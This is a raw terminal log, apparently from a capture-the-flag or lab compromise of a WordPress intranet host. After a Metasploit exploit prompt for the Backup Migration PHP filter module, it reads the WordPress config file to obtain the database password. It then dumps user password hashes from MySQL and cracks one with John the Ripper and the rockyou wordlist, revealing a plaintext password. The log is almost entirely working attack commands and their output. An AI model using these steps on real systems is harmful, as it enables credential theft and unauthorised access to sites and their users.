
exploit(multi/http/wp_backup_migration_php_filter) > 

www-data@intranet:/$ cat /etc/wordpress/config-172.23.1.50.php
cat /etc/wordpress/config-172.23.1.50.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', '72f8214a51b7bce');
define('DB_HOST', 'localhost');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>


 mysql -u wordpress -p'72f8214a51b7bce' -e "SELECT user_login, user_pass FROM wordpress.wp_users;"
<ECT user_login, user_pass FROM wordpress.wp_users;"
mysql: [Warning] Using a password on the command line interface can be insecure.
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BIYBi54vVzBrCeROH54sX19Ypa1F0o.     |
| leandro    | $P$BdIPuD09DWmZKJQ6btXbgR8eIkWy/q. |
+------------+------------------------------------+


john --format=phpass leandro_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 

leandro ($P$BdIPuD09DWmZKJQ6btXbgR8eIkWy/q.)==>  quicksilver